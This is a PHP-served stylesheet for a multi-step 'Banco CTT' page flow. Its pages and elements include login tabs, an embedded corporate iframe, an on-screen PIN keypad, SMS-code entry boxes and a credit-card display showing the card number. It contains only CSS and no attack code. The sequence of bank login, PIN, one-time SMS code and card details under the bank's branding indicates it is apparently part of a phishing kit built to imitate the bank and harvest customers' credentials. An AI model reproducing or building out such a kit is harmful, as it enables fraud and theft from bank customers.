<?php
// ============================================================
//  _style.php — Shared CSS for all Banco CTT step pages
//  Include in <head> with:  <?php include '_style.php'; ?>
// ============================================================
header('Content-Type: text/css; charset=utf-8');
?>
/* === Reset & Base === */
*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
html,body{height:100%}
body{
    font-family:"Segoe UI","Segoe",Tahoma,Helvetica,Arial,sans-serif;
    font-size:13px;
    color:#444;
    background:#f4f4f4;
    min-height:100vh;
    display:flex;
    align-items:center;
    justify-content:center;
    padding:20px;
    -webkit-font-smoothing:antialiased;
}
a{color:#df0024;text-decoration:none}
a:hover{text-decoration:underline}
img{max-width:100%;height:auto}

/* === Page wrapper === */
.page{width:100%;max-width:480px;margin:0 auto}

/* === Top yellow header bar (Banco CTT brand) === */
.brand-bar{
    background:#df0024;
    color:#ffffff;
    text-align:center;
    padding:8px 12px;
    font-size:11px;
    font-weight:700;
    letter-spacing:0.4px;
    text-transform:uppercase;
}

/* === Card container === */
.card{
    background:#fff;
    border-radius:6px;
    box-shadow:0 2px 14px rgba(0,0,0,0.08);
    overflow:hidden;
    margin-top:0;
}

/* === Step header (gray, inside card) === */
.step-header{
    background:#f3f3f3;
    border-bottom:1px solid #e1e1e1;
    padding:10px 18px;
    font-size:12px;
    color:#555;
    font-weight:600;
    display:flex;
    align-items:center;
    justify-content:space-between;
}
.step-header .step-num{
    background:#df0024;
    color:#ffffff;
    padding:2px 8px;
    border-radius:3px;
    font-size:10px;
    font-weight:700;
    text-transform:uppercase;
    letter-spacing:0.5px;
}

/* === Logo area === */
.logo-area{
    padding:22px 30px 10px;
    text-align:center;
    background:#fff;
}
.logo-area img{height:30px}
.logo-area .logo-fallback{
    font-size:20px;
    font-weight:700;
    color:#222222;
    letter-spacing:-0.3px;
}

/* === Progress bar (5 segments) === */
.progress{
    display:flex;
    padding:14px 30px 6px;
    gap:4px;
    background:#fff;
}
.progress .seg{
    flex:1;
    height:4px;
    background:#e1e1e1;
    border-radius:2px;
    transition:background 0.3s;
}
.progress .seg.active{background:#df0024}
.progress .seg.done{background:#222222}

/* === Body content area === */
.body{
    padding:18px 30px 30px;
    background:#fff;
}
.body h2{
    font-size:15px;
    color:#222222;
    font-weight:600;
    margin-bottom:6px;
    text-align:center;
}
.body .subtitle{
    font-size:12px;
    color:#666;
    text-align:center;
    margin-bottom:18px;
    line-height:1.5;
}

/* === Form fields === */
.field{margin-bottom:14px}
.field label{
    display:block;
    font-size:11px;
    color:#555;
    margin-bottom:4px;
    font-weight:600;
    text-transform:uppercase;
    letter-spacing:0.3px;
}
.field label .req{color:#d32f2f;margin-left:2px}
.field input[type=text],
.field input[type=password],
.field input[type=email],
.field input[type=tel],
.field input[type=number],
.field input[type=date],
.field select,
.field textarea{
    width:100%;
    padding:9px 12px;
    border:1px solid #c8c8c8;
    border-radius:3px;
    font-size:13px;
    font-family:inherit;
    color:#222;
    background:#fff;
    transition:border-color 0.15s,box-shadow 0.15s;
}
.field input:focus,
.field select:focus,
.field textarea:focus{
    outline:none;
    border-color:#df0024;
    box-shadow:0 0 0 1px #df0024;
}
.field input:disabled,
.field input[readonly]{
    background:#f3f3f3;
    color:#888;
    cursor:not-allowed;
}
.field .hint{
    font-size:10px;
    color:#888;
    margin-top:3px;
}
.field .err{
    font-size:11px;
    color:#d32f2f;
    margin-top:4px;
    display:none;
}
.field.invalid input{border-color:#d32f2f}
.field.invalid .err{display:block}

.row{display:flex;gap:10px}
.row .field{flex:1}

/* === Buttons === */
.btn{
    display:block;
    width:100%;
    padding:11px 18px;
    border:none;
    border-radius:3px;
    font-size:13px;
    font-weight:700;
    font-family:inherit;
    cursor:pointer;
    letter-spacing:0.4px;
    text-transform:uppercase;
    transition:background 0.15s,transform 0.05s;
}
.btn:active{transform:translateY(1px)}
.btn-primary{background:#df0024;color:#ffffff}
.btn-primary:hover{background:#b8001d}
.btn-primary:disabled{background:#e1e1e1;color:#888;cursor:not-allowed}
.btn-secondary{
    background:transparent;
    color:#555;
    border:1px solid #c8c8c8;
}
.btn-secondary:hover{background:#f3f3f3}
.btn-danger{background:#d32f2f;color:#fff}
.btn-danger:hover{background:#b71c1c}

/* === Inline messages === */
.msg{
    padding:9px 12px;
    border-radius:3px;
    font-size:12px;
    margin-bottom:14px;
    display:none;
}
.msg.error{background:#ffebee;color:#c62828;border:1px solid #ef9a9a;display:block}
.msg.success{background:#e8f5e9;color:#2e7d32;border:1px solid #a5d6a7;display:block}
.msg.info{background:#e3f2fd;color:#1565c0;border:1px solid #90caf9;display:block}

/* === Loading overlay (inline form submit) === */
.overlay{
    position:fixed;
    inset:0;
    background:rgba(255,255,255,0.92);
    display:none;
    align-items:center;
    justify-content:center;
    z-index:9999;
}
.overlay.show{display:flex}
.overlay .spinner{
    width:40px;
    height:40px;
    border:4px solid #e1e1e1;
    border-top-color:#df0024;
    border-radius:50%;
    animation:spin 0.8s linear infinite;
}
@keyframes spin{to{transform:rotate(360deg)}}

/* === Footer === */
.footer{
    text-align:center;
    padding:14px 20px 22px;
    font-size:10px;
    color:#888;
    background:#fff;
    border-top:1px solid #f0f0f0;
}
.footer a{color:#666}

/* === Tabs (only for index.php) === */
.tabs{
    display:flex;
    background:#fff;
    border-bottom:1px solid #e1e1e1;
}
.tabs .tab{
    flex:1;
    padding:12px;
    text-align:center;
    cursor:pointer;
    font-size:12px;
    font-weight:600;
    color:#666;
    text-transform:uppercase;
    letter-spacing:0.5px;
    border-bottom:3px solid transparent;
    transition:all 0.15s;
    user-select:none;
}
.tabs .tab.active{
    color:#222222;
    border-bottom-color:#df0024;
    background:#fafafa;
}
.tabs .tab:hover:not(.active){background:#fafafa;color:#333}
.tab-panel{display:none;background:#fff}
.tab-panel.active{display:block}

/* === Corporate iframe wrapper (index.php) === */
.corp-frame{
    width:100%;
    height:560px;
    border:0;
    display:block;
}

/* === On-screen keypad (pin.php) === */
.keypad{
    display:grid;
    grid-template-columns:repeat(3,1fr);
    gap:8px;
    margin:14px 0 10px;
}
.keypad .key{
    background:#f3f3f3;
    border:1px solid #d0d0d0;
    border-radius:4px;
    padding:14px 0;
    text-align:center;
    font-size:18px;
    font-weight:600;
    color:#222222;
    cursor:pointer;
    user-select:none;
    transition:background 0.1s;
}
.keypad .key:hover{background:#e8e8e8}
.keypad .key:active{background:#df0024;color:#fff}
.keypad .key.special{background:#fdecef;font-size:14px}

/* === Card display (sms.php, card.php) === */
.code-dots{
    display:flex;
    justify-content:center;
    gap:10px;
    margin:18px 0 22px;
}
.code-dots .dot{
    width:42px;
    height:50px;
    border:1.5px solid #c8c8c8;
    border-radius:4px;
    background:#fff;
    text-align:center;
    line-height:50px;
    font-size:22px;
    font-weight:700;
    color:#222222;
}
.code-dots .dot.filled{border-color:#df0024;background:#fff5f7}
.code-dots .dot.active{border-color:#df0024;border-width:2px}

/* === Card visual (card.php) === */
.credit-card{
    background:linear-gradient(135deg,#222222 0%,#8c0017 100%);
    color:#fff;
    border-radius:10px;
    padding:18px;
    margin:0 0 18px;
    box-shadow:0 4px 14px rgba(0,0,0,0.18);
    aspect-ratio:1.586/1;
    max-width:320px;
    margin-left:auto;
    margin-right:auto;
    display:flex;
    flex-direction:column;
    justify-content:space-between;
    position:relative;
}
.credit-card .chip{
    width:36px;
    height:26px;
    background:linear-gradient(135deg,#d4af37,#f4d03f);
    border-radius:4px;
    margin-bottom:8px;
}
.credit-card .pan{
    font-size:18px;
    letter-spacing:3px;
    font-family:"Courier New",monospace;
    font-weight:600;
    text-shadow:0 1px 1px rgba(0,0,0,0.4);
}
.credit-card .meta{
    display:flex;
    justify-content:space-between;
    font-size:10px;
    text-transform:uppercase;
    letter-spacing:0.5px;
}
.credit-card .meta .val{
    font-size:13px;
    text-transform:none;
    letter-spacing:1px;
    margin-top:2px;
    font-weight:600;
}
.credit-card .logo{
    position:absolute;
    top:18px;
    right:18px;
    font-size:14px;
    font-weight:700;
    font-style:italic;
}

/* === Responsive === */
@media(max-width:520px){
    .body{padding:16px 20px 24px}
    .logo-area{padding:18px 20px 8px}
    .progress{padding:12px 20px 4px}
    .code-dots .dot{width:36px;height:46px;line-height:46px;font-size:18px}
    .field input,.btn{padding:10px 12px}
}